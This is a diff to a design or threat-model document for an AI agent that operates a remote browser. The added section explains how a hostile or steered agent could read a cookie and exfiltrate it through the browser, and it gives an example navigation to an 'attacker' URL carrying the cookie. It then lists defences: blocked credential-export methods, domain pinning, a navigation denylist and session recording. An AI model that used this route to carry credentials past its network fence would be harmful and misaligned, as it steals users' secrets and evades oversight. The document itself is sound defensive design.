@@ -190,6 +190,37 @@ carry them off. Two layers:
     the deployment can gate `publish` closed while a web session is
     open; that is a policy knob, not a default.
 
+### The remote browser is itself an open-web egress path (irreducible)
+
+The container fence and the door bounds above are about the CONTAINER.
+The browser is remote and on the open web BY DESIGN, so a mind that has
+read a cookie via `Runtime.evaluate` can also make the BROWSER carry it
+out: `Page.navigate("https://attacker/?c=<cookie>")`, or a `fetch()`
+inside an `evaluate`. `allowedHosts` never sees this; it is Browser
+Run's own egress. This is the confused-deputy limit restated (spec 0003
+section 5): a hostile mind wielding the agent's own legitimate browser
+cannot be stopped by a network boundary, only bounded and observed. The
+layers, honestly labelled as bound-and-detect, not prevent:
+- **Bulk export is blocked**: the credential-export CDP methods are
+  dropped, so the mind cannot dump the whole cookie jar or the passkeys
+  in one call; it is reduced to whatever a single `evaluate` reads.
+- **Scoped sessions are fenced at the platform**: a session whose work
+  is one site (`x-account`, `github`) is opened with Browser Run
+  `allowedDomainSets` pinned to that site's domains, so the REMOTE
+  browser itself cannot reach an attacker origin. Only an open-ended
+  `research` session is unfenced, and that is the case the next layers
+  cover.
+- **The relay checks navigation**: `Page.navigate` targets are matched
+  against the origin denylist; a deployment that wants to harden an
+  open-ended session can run it denylist-heavy or, in the extreme,
+  allowlist-only.
+- **Detection, not prevention, for the rest**: the session recording,
+  the navigation ledger, the per-wake caps, and delete-session are the
+  containment for the residual exactly as they are everywhere the
+  hostile-mind doctrine applies. The web door does not claim to prevent
+  a steered mind from misusing a session it legitimately holds; no door
+  does.
+
 - **Session lifetime and concurrency.** A session may live for the
   WHOLE wake: some work needs a browser open end to end, and the wake
   hard wall is the natural time bound (every session closes and
